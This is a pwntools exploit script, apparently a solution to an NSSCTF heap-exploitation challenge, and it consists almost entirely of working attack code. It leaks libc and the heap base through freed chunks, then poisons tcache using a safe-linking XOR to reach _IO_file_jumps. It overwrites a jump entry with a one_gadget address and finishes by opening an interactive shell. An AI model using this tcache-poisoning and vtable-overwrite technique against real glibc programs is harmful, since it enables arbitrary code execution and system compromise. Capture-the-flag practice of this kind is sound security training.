from pwn import *
context.log_level = 'debug'
io = gdb.debug('./pwn')
# io = remote('node4.anna.nssctf.cn',28254)
elf = ELF('./pwn')
lib = ELF('/home/bamuwe/duck/libc.so.6')
def add():
    io.sendlineafter(b'Choice: ',b'1')
    
def free(idx):
    io.sendlineafter(b'Choice: ',b'2')
    io.sendlineafter(b'Idx: \n',str(int(idx)))
    
def show(idx):
    io.sendlineafter(b'Choice: ',b'3')
    io.sendlineafter(b'Idx: \n',str(int(idx)))
    
def edit(idx,content):
    io.sendlineafter(b'Choice: ',b'4')
    io.sendlineafter(b'Idx: \n',str(int(idx)))
    io.sendlineafter(b'Size: \n',str(int(0x100)))
    io.send(content)

for i in range(9):
    add()           #0-7
for i in range(9):
    free(i)         #0-7
                    
#leak_libc
show(7)
main_arena_addr = u64(io.recv(6).ljust(8,b'\x00'))-96
libc_offset = main_arena_addr-lib.sym['main_arena']
one_addr = 0xda864+libc_offset
IO_file_jumps = libc_offset + lib.sym['_IO_file_jumps']
success(f'main_arena_addr=>{hex(main_arena_addr)}')
success(f'one_addr=>{hex(one_addr)}')
success(f'IO_file_jumps=>{hex(IO_file_jumps)}')
#leak_heap_base
show(0)
heap_base_addr = u64(io.recv(5).ljust(8,b'\x00'))
success(f'heap_base_addr=>{hex(heap_base_addr)}')

for i in range(5):
    add()           #8-13
edit(1,p64(heap_base_addr^IO_file_jumps))       #对chunk0修改
add()               #14
add()               #15
edit(15,p64(0)*3+p64(one_addr))
io.interactive()